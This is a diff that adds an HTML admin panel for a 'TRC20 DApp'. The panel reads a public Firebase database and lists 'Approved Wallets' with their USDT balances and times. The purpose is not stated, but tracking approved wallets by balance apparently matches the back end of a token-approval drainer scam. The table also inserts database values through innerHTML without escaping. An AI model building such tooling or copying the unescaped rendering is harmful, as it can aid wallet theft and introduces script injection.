@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Admin Panel - TRC20 DApp</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f2f2f2;
+      padding: 20px;
+    }
+
+    h1 {
+      text-align: center;
+      color: #333;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 20px;
+      background: white;
+      border-radius: 8px;
+      overflow: hidden;
+    }
+
+    th, td {
+      padding: 12px 16px;
+      border-bottom: 1px solid #ddd;
+      text-align: left;
+    }
+
+    th {
+      background-color: #002fff;
+      color: white;
+    }
+
+    tr:hover {
+      background-color: #f1f1f1;
+    }
+
+    @media(max-width: 600px) {
+      table, thead, tbody, th, td, tr {
+        display: block;
+      }
+
+      tr {
+        margin-bottom: 15px;
+        border: 1px solid #ddd;
+        border-radius: 8px;
+      }
+
+      td {
+        padding: 10px;
+        text-align: right;
+        position: relative;
+      }
+
+      td::before {
+        content: attr(data-label);
+        position: absolute;
+        left: 10px;
+        top: 10px;
+        font-weight: bold;
+        text-align: left;
+      }
+
+      th {
+        display: none;
+      }
+    }
+  </style>
+</head>
+<body>
+  <h1>Approved Wallets</h1>
+  <table>
+    <thead>
+      <tr>
+        <th>Wallet Address</th>
+        <th>Balance (USDT)</th>
+        <th>Time</th>
+      </tr>
+    </thead>
+    <tbody id="data-table">
+    </tbody>
+  </table>
+
+  <script>
+    const firebaseConfig = {
+      databaseURL: "https://the-og-3a37e-default-rtdb.asia-southeast1.firebasedatabase.app/"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    function formatTime(timestamp) {
+      const date = new Date(timestamp);
+      return date.toLocaleString();
+    }
+
+    db.ref("users").on("value", snapshot => {
+      const data = snapshot.val();
+      const table = document.getElementById("data-table");
+      table.innerHTML = "";
+
+      if (data) {
+        Object.keys(data).forEach(addr => {
+          const row = data[addr];
+          const tr = document.createElement("tr");
+
+          tr.innerHTML = `
+            <td data-label="Wallet">${row.address}</td>
+            <td data-label="Balance">${row.balance}</td>
+            <td data-label="Time">${formatTime(row.timestamp)}</td>
+          `;
+
+          table.appendChild(tr);
+        });
+      }
+    });
+  </script>
+</body>
+</html>
